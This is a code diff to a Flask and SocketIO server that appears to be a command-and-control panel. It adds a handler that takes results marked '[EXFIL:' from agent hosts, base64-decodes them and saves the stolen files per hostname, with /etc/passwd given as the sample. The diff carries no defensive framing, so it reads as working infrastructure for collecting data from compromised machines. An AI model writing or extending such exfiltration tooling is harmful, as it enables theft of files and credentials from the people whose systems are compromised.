@@ -6,6 +6,7 @@ from flask_login import LoginManager, UserMixin, login_user, logout_user, login_
 from flask_socketio import SocketIO, emit
 import sqlite3
 import os
+import base64
 import json
 import sys
 from datetime import datetime
@@ -165,6 +166,27 @@ def result():
     hostname = data.get("hostname")
     command = data.get("command")
     result = data.get("result")
+
+
+    if result.startswith("[EXFIL:"):
+        lines = result.splitlines()
+        header = lines[0]  # e.g., [EXFIL:/etc/passwd]
+        b64data = "\n".join(lines[1:])
+        filepath = header.split(":", 1)[1].strip().rstrip("]")
+        filename = os.path.basename(filepath)
+        decoded = base64.b64decode(b64data)
+
+        outdir = os.path.join("downloads", hostname)
+        os.makedirs(outdir, exist_ok=True)
+
+        full_path = os.path.join(outdir, filename)
+        print(f"[DEBUG] Saving to: {full_path}")
+        with open(full_path, "wb") as f:
+            f.write(decoded)
+
+        print(f"[+] File received from {hostname}: {filename} saved to {full_path}")
+
+
 
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
